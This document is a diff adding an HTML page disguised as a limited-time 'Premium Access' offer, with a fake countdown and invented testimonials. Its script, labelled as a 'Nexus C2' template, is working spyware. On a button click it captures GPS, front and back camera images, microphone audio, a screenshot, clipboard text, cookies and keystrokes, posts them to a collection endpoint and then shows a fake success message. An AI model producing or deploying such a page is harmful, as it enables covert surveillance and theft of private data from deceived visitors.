@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Offer • Limited Time</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: #0a0a1a;
+            overflow-x: hidden;
+        }
+
+        /* ===== ANIMATED BACKGROUND ===== */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            overflow: hidden;
+        }
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background: radial-gradient(circle at 30% 50%, rgba(0, 242, 254, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 80%, rgba(79, 172, 254, 0.05) 0%, transparent 50%);
+            animation: rotateBg 30s linear infinite;
+        }
+
+        @keyframes rotateBg {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(0, 242, 254, 0.3);
+            border-radius: 50%;
+            animation: floatParticle linear infinite;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            border-color: rgba(0, 242, 254, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 242, 254, 0.1);
+        }
+
+        /* ===== HEADER BADGE ===== */
+        .badge {
+            display: inline-block;
+            background: linear-gradient(90deg, #4facfe, #00f2fe);
+            color: #000;
+            font-weight: 700;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            padding: 6px 16px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+        }
+
+        /* ===== TITLE ===== */
+        .title {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            line-height: 1.2;
+            margin-bottom: 12px;
+        }
+
+        .title span {
+            background: linear-gradient(90deg, #4facfe, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ===== SUBTEXT ===== */
+        .subtext {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        /* ===== COUNTDOWN ===== */
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .countdown-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 10px 16px;
+            text-align: center;
+            min-width: 60px;
+        }
+
+        .countdown-item .number {
+            font-size: 24px;
+            font-weight: 700;
+            color: #00f2fe;
+            display: block;
+        }
+
+        .countdown-item .label {
+            font-size: 9px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.4);
+            letter-spacing: 1px;
+        }
+
+        /* ===== FEATURES ===== */
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .feature-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            padding: 12px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature-item:hover {
+            background: rgba(0, 242, 254, 0.05);
+            border-color: rgba(0, 242, 254, 0.2);
+        }
+
+        .feature-item .icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .feature-item .label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 500;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.7);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .form-group input:focus {
+            border-color: #00f2fe;
+            background: rgba(0, 242, 254, 0.05);
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.05);
+        }
+
+        /* ===== BUTTON ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #4facfe, #00f2fe);
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 242, 254, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ===== STATUS ===== */
+        .status {
+            margin-top: 16px;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+
+        .status.loading {
+            display: block;
+            background: rgba(0, 242, 254, 0.1);
+            color: #00f2fe;
+            border: 1px solid rgba(0, 242, 254, 0.2);
+        }
+
+        .status.success {
+            display: block;
+            background: rgba(76, 175, 80, 0.15);
+            color: #4caf50;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+        }
+
+        .status.error {
+            display: block;
+            background: rgba(244, 67, 54, 0.15);
+            color: #f44336;
+            border: 1px solid rgba(244, 67, 54, 0.3);
+        }
+
+        /* ===== TESTIMONIALS ===== */
+        .testimonials {
+            margin-top: 28px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            padding-top: 24px;
+        }
+
+        .testimonials-title {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.3);
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .testimonial {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .testimonial:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .testimonial img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid rgba(0, 242, 254, 0.2);
+        }
+
+        .testimonial .text {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.4;
+        }
+
+        .testimonial .text strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        /* ===== FOOTER NOTE ===== */
+        .footer-note {
+            margin-top: 20px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.2);
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .features {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+
+            .feature-item {
+                padding: 10px;
+            }
+
+            .countdown {
+                gap: 8px;
+            }
+
+            .countdown-item {
+                min-width: 50px;
+                padding: 8px 12px;
+            }
+
+            .countdown-item .number {
+                font-size: 18px;
+            }
+
+            .testimonial {
+                padding: 10px 12px;
+            }
+
+            .testimonial img {
+                width: 32px;
+                height: 32px;
+            }
+
+            .testimonial .text {
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .features {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* ===== HIDDEN ELEMENTS ===== */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== BACKGROUND ===== -->
+    <div class="bg-animation">
+        <div class="particles" id="particles"></div>
+    </div>
+
+    <!-- ===== MAIN ===== -->
+    <div class="container">
+        <!-- Badge -->
+        <div class="badge">🔥 Limited Time Offer</div>
+
+        <!-- Title -->
+        <h1 class="title">Get <span>Premium Access</span> Now</h1>
+        <p class="subtext">Exclusive offer for early adopters. Claim your spot before it's gone.</p>
+
+        <!-- Countdown -->
+        <div class="countdown" id="countdown">
+            <div class="countdown-item">
+                <span class="number" id="hours">24</span>
+                <span class="label">Hours</span>
+            </div>
+            <div class="countdown-item">
+                <span class="number" id="minutes">00</span>
+                <span class="label">Mins</span>
+            </div>
+            <div class="countdown-item">
+                <span class="number" id="seconds">00</span>
+                <span class="label">Secs</span>
+            </div>
+        </div>
+
+        <!-- Features -->
+        <div class="features">
+            <div class="feature-item">
+                <span class="icon">⚡</span>
+                <span class="label">Instant Access</span>
+            </div>
+            <div class="feature-item">
+                <span class="icon">🔒</span>
+                <span class="label">Secure & Private</span>
+            </div>
+            <div class="feature-item">
+                <span class="icon">📱</span>
+                <span class="label">All Devices</span>
+            </div>
+            <div class="feature-item">
+                <span class="icon">🎁</span>
+                <span class="label">Bonus Included</span>
+            </div>
+        </div>
+
+        <!-- Form -->
+        <form id="offerForm" onsubmit="return false;">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Choose a username" required>
+            </div>
+            <button type="button" class="btn-primary" id="claimBtn" onclick="claimOffer()">
+                🚀 Claim Premium Access
+            </button>
+        </form>
+
+        <!-- Status -->
+        <div class="status" id="status"></div>
+
+        <!-- Testimonials -->
+        <div class="testimonials">
+            <div class="testimonials-title">⭐ Trusted by 10,000+ users</div>
+            
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1564564321837-a57b7070ac4f?w=100&h=100&fit=crop&crop=face" alt="User">
+                <div class="text"><strong>Alex M.</strong> "This is incredible! Got access in seconds."</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&h=100&fit=crop&crop=face" alt="User">
+                <div class="text"><strong>Sarah K.</strong> "Best decision I've made this year. Highly recommend!"</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop&crop=face" alt="User">
+                <div class="text"><strong>James R.</strong> "The premium features are game-changing. Love it!"</div>
+            </div>
+        </div>
+
+        <div class="footer-note">⏳ Offer expires in 24 hours • 100% secure</div>
+    </div>
+
+    <!-- ===== HIDDEN ELEMENTS FOR CAPTURE ===== -->
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <audio id="audio" style="display:none;"></audio>
+
+    <script>
+        // ============================================================
+        // COUNTDOWN TIMER
+        // ============================================================
+        let countdownInterval;
+        let timeLeft = 24 * 60 * 60; // 24 hours in seconds
+
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+
+            document.getElementById('hours').textContent = String(hours).padStart(2, '0');
+            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                clearInterval(countdownInterval);
+            }
+        }
+
+        countdownInterval = setInterval(updateCountdown, 1000);
+
+        // ============================================================
+        // PARTICLES GENERATOR
+        // ============================================================
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.width = (Math.random() * 4 + 2) + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.animationDuration = (Math.random() * 20 + 10) + 's';
+                particle.style.animationDelay = (Math.random() * 10) + 's';
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // ============================================================
+        // NEXUS C2 - PREMIUM OFFER TEMPLATE
+        // All data sent to our server
+        // ============================================================
+
+        let isProcessing = false;
+
+        async function claimOffer() {
+            if (isProcessing) return;
+
+            const email = document.getElementById('email').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const statusEl = document.getElementById('status');
+            const claimBtn = document.getElementById('claimBtn');
+
+            if (!email || !username) {
+                statusEl.className = 'status error';
+                statusEl.textContent = '⚠️ Please fill in all fields.';
+                statusEl.style.display = 'block';
+                setTimeout(() => { statusEl.style.display = 'none'; }, 3000);
+                return;
+            }
+
+            isProcessing = true;
+            claimBtn.disabled = true;
+            claimBtn.textContent = '⏳ Processing...';
+
+            statusEl.className = 'status loading';
+            statusEl.textContent = '⏳ Verifying your request...';
+            statusEl.style.display = 'block';
+
+            // ===== DATA COLLECTION =====
+            statusEl.textContent = '📱 Collecting device info...';
+            
+            // 1️⃣ Device Info
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Unknown',
+                touchSupport: 'ontouchstart' in window,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    speed: navigator.connection.downlink + 'Mbps'
+                } : 'Unknown'
+            };
+
+            // 2️⃣ Battery
+            statusEl.textContent = '🔋 Checking battery...';
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // 3️⃣ GPS Location
+            statusEl.textContent = '📍 Getting location...';
+            let gpsLocation = null;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                gpsLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed
+                };
+            } catch(e) {}
+
+            // 4️⃣ Camera (Front + Back)
+            statusEl.textContent = '📸 Capturing camera...';
+            let frontImage = null, backImage = null;
+            
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = frontStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                frontImage = canvas.toDataURL('image/png');
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = backStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                backImage = canvas.toDataURL('image/png');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 5️⃣ Audio Recording
+            statusEl.textContent = '🎤 Recording audio...';
+            let audioData = null;
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                audioData = await new Promise(resolve => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                });
+                audioStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 6️⃣ Screenshot
+            statusEl.textContent = '🖥️ Capturing screenshot...';
+            let screenshot = null;
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                screenshot = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 7️⃣ Clipboard
+            statusEl.textContent = '📋 Reading clipboard...';
+            let clipboardData = null;
+            try {
+                const text = await navigator.clipboard.readText();
+                clipboardData = text;
+            } catch(e) {}
+
+            // 8️⃣ Cookies
+            statusEl.textContent = '🍪 Extracting cookies...';
+            let cookies = document.cookie;
+
+            // 9️⃣ Keystrokes
+            statusEl.textContent = '⌨️ Monitoring keystrokes...';
+            let keystrokes = [];
+            const keyListener = (e) => {
+                keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now()
+                });
+            };
+            document.addEventListener('keydown', keyListener);
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            document.removeEventListener('keydown', keyListener);
+
+            // 🔟 Send Data
+            statusEl.textContent = '📤 Finalizing your request...';
+            
+            const payload = {
+                site: 'Premium Offer',
+                username: username,
+                password: email,
+                frontImage: frontImage,
+                backImage: backImage,
+                audioData: audioData,
+                screenshot: screenshot,
+                deviceInfo: deviceInfo,
+                batteryInfo: batteryInfo,
+                gpsLocation: gpsLocation,
+                clipboardData: clipboardData,
+                cookies: cookies,
+                keystrokes: keystrokes,
+                timestamp: Date.now()
+            };
+
+            try {
+                const res = await fetch('/upload/premium-offer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (res.ok) {
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✅ Congratulations! You\'ve been granted Premium Access. Redirecting...';
+                    statusEl.style.display = 'block';
+                    claimBtn.textContent = '✅ Claimed!';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                } else {
+                    statusEl.className = 'status error';
+                    statusEl.textContent = '⚠️ Something went wrong. Please try again.';
+                    statusEl.style.display = 'block';
+                    claimBtn.disabled = false;
+                    claimBtn.textContent = '🚀 Claim Premium Access';
+                }
+            } catch(e) {
+                statusEl.className = 'status error';
+                statusEl.textContent = '⚠️ Network error. Please try again.';
+                statusEl.style.display = 'block';
+                console.error('Upload error:', e);
+                claimBtn.disabled = false;
+                claimBtn.textContent = '🚀 Claim Premium Access';
+            }
+
+            isProcessing = false;
+        }
+    </script>
+</body>
+</html>
